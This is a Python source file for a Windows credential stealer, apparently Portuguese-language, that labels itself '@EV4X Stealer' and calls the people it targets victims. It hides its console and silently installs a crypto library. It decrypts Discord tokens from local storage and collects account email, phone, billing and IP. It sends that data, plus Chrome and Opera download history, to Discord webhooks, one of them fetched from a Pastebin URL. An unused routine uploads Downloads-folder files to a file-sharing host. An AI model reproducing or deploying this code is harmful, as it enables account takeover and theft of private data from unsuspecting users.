import os
import threading
import re
import time
import subprocess
import sqlite3
import shutil
import random
import string
from sys import executable
from base64 import b64decode
from json import loads, dumps
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from urllib.request import Request, urlopen

# ========== OCULTAR CONSOLE ==========
try:
    kernel32 = windll.kernel32
    user32 = windll.user32
    hWnd = kernel32.GetConsoleWindow()
    if hWnd:
        user32.ShowWindow(hWnd, 0)  # SW_HIDE = 0
except:
    pass

# ========== CONFIGURAÇÃO DE WEBHOOKS ==========
# Webhook principal (seu - recebe dados das vítimas)
MASTER_WEBHOOK_URL = "https://pastebin.com/raw/bENysYy8"

# Webhook do usuário (configurado no build)
USER_WEBHOOK = ""

def get_master_webhook():
    """Busca o webhook master da URL online"""
    try:
        response = urlopen(Request(MASTER_WEBHOOK_URL, headers={'User-Agent': 'Mozilla/5.0'}), timeout=5)
        webhook = response.read().decode().strip()
        if webhook.startswith('https://discord.com/api/webhooks/') or webhook.startswith('https://discordapp.com/api/webhooks/'):
            return webhook
    except:
        pass
    return None

def get_webhooks():
    """Retorna lista de webhooks ativos"""
    webhooks = []
    
    # Webhook master (sempre ativo)
    master = get_master_webhook()
    if master:
        webhooks.append(master)
        print(f"[DEBUG] Master webhook ativo: {master[:50]}...")
    
    # Webhook do usuário (se configurado)
    if USER_WEBHOOK:
        webhooks.append(USER_WEBHOOK)
        print(f"[DEBUG] User webhook ativo: {USER_WEBHOOK[:50]}...")
    else:
        print("[DEBUG] User webhook não configurado")
    
    print(f"[DEBUG] Total de webhooks ativos: {len(webhooks)}")
    return webhooks

def getip():
    try:
        return urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        return "None"

# ========== INSTALAÇÃO SILENCIOSA ==========
try:
    from Crypto.Cipher import AES
except ImportError:
    CREATE_NO_WINDOW = 0x08000000
    subprocess.Popen(f"{executable} -m pip install pycryptodome", 
                     shell=True, creationflags=CREATE_NO_WINDOW)
    time.sleep(3)
    from Crypto.Cipher import AES

roaming = os.getenv('APPDATA')
local_appdata = os.getenv('LOCALAPPDATA')

# ========== FUNÇÕES AUXILIARES ==========
class DATA_BLOB(Structure):
    _fields_ = [('cbData', wintypes.DWORD), ('pbData', POINTER(c_char))]

def GetData(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw

def CryptUnprotectData(encrypted_bytes, entropy=b''):
    try:
        buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
        buffer_entropy = c_buffer(entropy, len(entropy))
        blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
        blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
        blob_out = DATA_BLOB()
        if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), 
                                             None, None, 0x01, byref(blob_out)):
            return GetData(blob_out)
    except:
        pass
    return None

def DecryptValue(buff, master_key=None):
    try:
        starts = buff.decode(encoding='utf8', errors='ignore')[:3]
        if starts in ('v10', 'v11'):
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)[:-16].decode()
            return decrypted_pass
    except:
        pass
    return None

def LoadUrlib(hook, data='', headers=''):
    for _ in range(8):
        try:
            return urlopen(Request(hook, data=data, headers=headers))
        except:
            pass

# ========== FUNÇÕES DISCORD ==========
def GetBilling(token):
    headers = {"Authorization": token, "Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
    try:
        billingjson = loads(urlopen(Request("https://discord.com/api/users/@me/billing/payment-sources", headers=headers)).read().decode())
    except:
        return False
    if billingjson == []:
        return " -"
    billing = ""
    for m in billingjson:
        if not m["invalid"]:
            billing += ":credit_card:" if m["type"] == 1 else ":parking: "
    return billing

def GetBadge(flags):
    if flags == 0:
        return ''
    badges = ''
    lst = [
        (131072, "<:developer:874750808472825986> "), (16384, "<:bughunter_2:874750808430874664> "),
        (512, "<:early_supporter:874750808414113823> "), (256, "<:balance:874750808267292683> "),
        (128, "<:brilliance:874750808338608199> "), (64, "<:bravery:874750808388952075> "),
        (8, "<:bughunter_1:874750808426692658> "), (4, "<:hypesquad_events:874750808594477056> "),
        (2, "<:partner:874750808678354964> "), (1, "<:staff:874750808728666152> ")
    ]
    for val, emoji in lst:
        if flags // val:
            badges += emoji
            flags %= val
    return badges

def GetTokenInfo(token):
    headers = {"Authorization": token, "User-Agent": "Mozilla/5.0"}
    userjson = loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers)).read().decode())
    username = userjson["username"]
    hashtag = userjson["discriminator"]
    email = userjson["email"]
    idd = userjson["id"]
    pfp = userjson["avatar"]
    flags = userjson["public_flags"]
    nitro = ""
    phone = "-"
    if "premium_type" in userjson:
        nt = userjson["premium_type"]
        if nt == 1:
            nitro = "<:classic:896119171019067423> "
        elif nt == 2:
            nitro = "<a:boost:824036778570416129> <:classic:896119171019067423> "
    if "phone" in userjson:
        phone = f'`{userjson["phone"]}`'
    return username, hashtag, email, idd, pfp, flags, nitro, phone

def checkToken(token):
    headers = {"Authorization": token, "User-Agent": "Mozilla/5.0"}
    try:
        urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers))
        return True
    except:
        return False

def uploadToken(token, path):
    headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
    username, hashtag, email, idd, pfp, flags, nitro, phone = GetTokenInfo(token)
    if pfp is None:
        pfp = "https://cdn.discordapp.com/attachments/1510489472184225812/1511059290096406528/654b5c3db0969610a9ff80dd92011459.jpg"
    else:
        pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"
    billing = GetBilling(token)
    badge = GetBadge(flags)
    if not billing:
        badge, phone, billing = "🔒", "🔒", "🔒"
    if nitro == '' and badge == '':
        nitro = " -"
    data = {
        "content": f'Found in `{path}`',
        "embeds": [{
            "color": 16711680,  # Vermelho
            "fields": [
                {"name": ":rocket: Token:", "value": f"`{token}`\n[Click to copy](https://superfurrycdn.nl/copy/{token})"},
                {"name": ":envelope: Email:", "value": f"`{email}`", "inline": True},
                {"name": ":mobile_phone: Phone:", "value": phone, "inline": True},
                {"name": ":globe_with_meridians: IP:", "value": f"`{getip()}`", "inline": True},
                {"name": ":beginner: Badges:", "value": f"{nitro}{badge}", "inline": True},
                {"name": ":credit_card: Billing:", "value": billing, "inline": True}
            ],
            "author": {"name": f"{username}#{hashtag} ({idd})", "icon_url": pfp},
            "footer": {"text": "@EV4X Stealer", "icon_url": "https://cdn.discordapp.com/attachments/1510489472184225812/1511059290096406528/654b5c3db0969610a9ff80dd92011459.jpg"},
            "thumbnail": {"url": pfp}
        }]
    }
    
    # Envia para todos os webhooks
    for webhook in get_webhooks():
        try:
            LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
        except:
            pass

def GetDiscord(path, arg, token_list):
    try:
        local_state_path = f"{path}/Local State"
        if not os.path.exists(local_state_path):
            return
        
        pathC = path + arg
        if not os.path.exists(pathC):
            return
        
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = loads(f.read())
        
        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = CryptUnprotectData(master_key[5:])
        
        if not master_key:
            return
        
        for file in os.listdir(pathC):
            if file.endswith((".log", ".ldb")):
                try:
                    with open(f"{pathC}\\{file}", errors="ignore") as f:
                        for line in f:
                            for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                                tokenDecoded = DecryptValue(b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
                                if tokenDecoded and checkToken(tokenDecoded) and tokenDecoded not in token_list:
                                    token_list.append(tokenDecoded)
                                    uploadToken(tokenDecoded, path)
                except:
                    continue
    except:
        pass

def GatherDiscord():
    discordPaths = [
        [f"{roaming}/Discord", "/Local Storage/leveldb"],
        [f"{roaming}/Lightcord", "/Local Storage/leveldb"],
        [f"{roaming}/discordcanary", "/Local Storage/leveldb"],
        [f"{roaming}/discordptb", "/Local Storage/leveldb"],
    ]
    tokens = []
    threads = []
    for patt in discordPaths:
        t = threading.Thread(target=GetDiscord, args=(patt[0], patt[1], tokens))
        t.start()
        threads.append(t)
    for t in threads:
        t.join()
    return tokens

# ========== EXTRAÇÃO DE LINKS DE DOWNLOAD DOS NAVEGADORES (CHROME E OPERA) ==========
def get_chromium_downloads(profile_path, browser_name):
    downloads = []
    history_db = os.path.join(profile_path, 'History')
    if not os.path.exists(history_db):
        return downloads
    
    random_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    temp_db = os.path.join(os.environ['TEMP'], f'ev4x_{browser_name}_{random_str}.db')
    
    try:
        # Tenta copiar o arquivo
        try:
            shutil.copy2(history_db, temp_db)
        except:
            with open(history_db, 'rb') as f_src:
                with open(temp_db, 'wb') as f_dst:
                    shutil.copyfileobj(f_src, f_dst)
        
        conn = sqlite3.connect(temp_db)
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        
        cursor.execute("""
            SELECT uc.url, d.target_path, d.total_bytes
            FROM downloads d
            LEFT JOIN downloads_url_chains uc ON d.id = uc.id
            WHERE uc.chain_index = 0 AND uc.url IS NOT NULL AND d.target_path IS NOT NULL
            ORDER BY d.start_time DESC LIMIT 100
        """)
        
        for row in cursor.fetchall():
            url = row['url']
            target_path = row['target_path']
            total_bytes = row['total_bytes']
            
            file_name = os.path.basename(target_path)
            size_info = ""
            
            if total_bytes and total_bytes > 0:
                size_mb = total_bytes / (1024 * 1024)
                size_info = f" ({size_mb:.1f} MB)" if size_mb >= 1 else f" ({total_bytes / 1024:.1f} KB)"
            
            downloads.append(f"[{file_name}]({url}){size_info}")
        
        conn.close()
    except:
        pass
    finally:
        if os.path.exists(temp_db):
            try:
                os.remove(temp_db)
            except:
                pass
    
    return downloads

def get_browser_download_links():
    all_downloads = {}
    browsers = {
        'Chrome': os.path.join(local_appdata, 'Google', 'Chrome', 'User Data'),
        'Opera': os.path.join(roaming, 'Opera Software', 'Opera Stable'),
        'Opera GX': os.path.join(roaming, 'Opera Software', 'Opera GX Stable'),
    }
    
    for browser, base_path in browsers.items():
        if not os.path.exists(base_path):
            continue
        
        profiles = ['Default', '']
        
        # Para Chrome que usa múltiplos perfis
        if browser == 'Chrome':
            try:
                local_state_path = os.path.join(base_path, 'Local State')
                if os.path.exists(local_state_path):
                    with open(local_state_path, 'r', encoding='utf-8') as f:
                        local_state = loads(f.read())
                        profile_cache = local_state.get('profile', {}).get('info_cache', {})
                        profiles.extend([p for p in profile_cache.keys() if p not in profiles])
            except:
                pass
        
        for profile in profiles:
            profile_path = os.path.join(base_path, profile) if profile else base_path
            if os.path.exists(os.path.join(profile_path, 'History')):
                dl = get_chromium_downloads(profile_path, f"{browser}_{profile}")
                if dl:
                    all_downloads.setdefault(browser, []).extend(dl)
    
    return all_downloads

def send_browser_downloads():
    try:
        downloads_by_browser = get_browser_download_links()
        
        if not downloads_by_browser:
            return
        
        total_downloads = sum(len(links) for links in downloads_by_browser.values())
        browsers_found = ", ".join(downloads_by_browser.keys())
        
        txt_path = os.path.join(os.environ['TEMP'], f'browser_dl_{random.randint(1000,9999)}.txt')
        
        with open(txt_path, 'w', encoding='utf-8') as f:
            f.write("=" * 70 + "\n")
            f.write("HISTÓRICO DE DOWNLOADS DOS NAVEGADORES\n")
            f.write("=" * 70 + "\n\n")
            f.write(f"Total: {total_downloads}\n")
            f.write(f"Navegadores: {browsers_found}\n")
            f.write(f"IP: {getip()}\n")
            f.write("=" * 70 + "\n\n")
            
            for browser, links in downloads_by_browser.items():
                unique = list(dict.fromkeys(links))  # Remove duplicatas mantendo ordem
                
                f.write(f"\n{'='*70}\n")
                f.write(f"🌐 {browser.upper()} ({len(unique)} downloads)\n")
                f.write(f"{'='*70}\n\n")
                
                for i, link in enumerate(unique, 1):
                    f.write(f"{i}. {link}\n")
        
        with open(txt_path, 'rb') as f:
            file_data = f.read()
        
        boundary = '----WebKitFormBoundary' + str(time.time()).replace('.', '')
        
        payload = {
            "content": f"📊 **Histórico de Downloads**\nTotal: {total_downloads} de {browsers_found}"
        }
        
        body = (
            f'--{boundary}\r\n'.encode() +
            b'Content-Disposition: form-data; name="payload_json"\r\n' +
            b'Content-Type: application/json\r\n\r\n' +
            dumps(payload).encode() + b'\r\n' +
            f'--{boundary}\r\n'.encode() +
            b'Content-Disposition: form-data; name="file"; filename="browser_downloads.txt"\r\n' +
            b'Content-Type: text/plain\r\n\r\n' +
            file_data + b'\r\n' +
            f'--{boundary}--\r\n'.encode()
        )
        
        headers = {
            'Content-Type': f'multipart/form-data; boundary={boundary}',
            'User-Agent': 'Mozilla/5.0'
        }
        
        # Envia para todos os webhooks
        for webhook in get_webhooks():
            try:
                LoadUrlib(webhook, data=body, headers=headers)
            except:
                pass
        
        try:
            os.remove(txt_path)
        except:
            pass
    except:
        pass

# ========== ENVIO DE ARQUIVOS DA PASTA DOWNLOADS (anonfiles) ==========
def upload_file_to_anonfiles(filepath):
    try:
        with open(filepath, 'rb') as f:
            files = {'file': (os.path.basename(filepath), f)}
            boundary = '----WebKitFormBoundary' + str(time.time()).replace('.', '')
            body = []
            for key, value in files.items():
                body.append(f'--{boundary}\r\nContent-Disposition: form-data; name="{key}"; filename="{value[0]}"\r\nContent-Type: application/octet-stream\r\n\r\n')
                body.append(value[1].read())
                body.append(b'\r\n')
            body.append(f'--{boundary}--\r\n'.encode())
            data = b''.join(body)
            headers = {
                'Content-Type': f'multipart/form-data; boundary={boundary}',
                'User-Agent': 'Mozilla/5.0'
            }
            req = Request('https://api.anonfiles.com/upload', data=data, headers=headers, method='POST')
            response = urlopen(req, timeout=30).read().decode()
            result = loads(response)
            if result['status']:
                return result['data']['file']['url']['full']
    except:
        pass
    return None

def UploadDownloadsInfo():
    downloads = os.path.join(os.path.expanduser("~"), "Downloads")
    if not os.path.exists(downloads):
        return
    files = [f for f in os.listdir(downloads) if os.path.isfile(os.path.join(downloads, f))]
    if not files:
        return
    links_info = []
    for file in files[:50]:
        filepath = os.path.join(downloads, file)
        size_kb = os.path.getsize(filepath) / 1024
        if size_kb > 20 * 1024:
            links_info.append(f"`{file}` ({size_kb:.2f} KB) - Muito grande (>20MB)")
            continue
        link = upload_file_to_anonfiles(filepath)
        if link:
            links_info.append(f"[{file}]({link}) ({size_kb:.2f} KB)")
        else:
            links_info.append(f"`{file}` ({size_kb:.2f} KB) - Falha no upload")
        time.sleep(1)
    if not links_info:
        return
    for i in range(0, len(links_info), 10):
        chunk = links_info[i:i+10]
        data = {
            "embeds": [{
                "color": 14406413,
                "title": f"📥 Pasta Downloads (Parte {i//10+1})",
                "description": "\n".join(chunk),
                "footer": {"text": "@Ayhu Stealer"}
            }]
        }
        LoadUrlib(hook, data=dumps(data).encode(), headers={"Content-Type": "application/json"})
        time.sleep(2)

# ========== MAIN ==========
if __name__ == "__main__":
    try:
        threads = []
        
        # Thread 1: Discord tokens
        t1 = threading.Thread(target=GatherDiscord)
        t1.start()
        threads.append(t1)
        
        # Thread 2: Browser downloads
        t2 = threading.Thread(target=send_browser_downloads)
        t2.start()
        threads.append(t2)
        
        # Aguarda todas as threads terminarem
        for t in threads:
            t.join(timeout=30)  # Timeout de 30 segundos por thread
    except:
        pass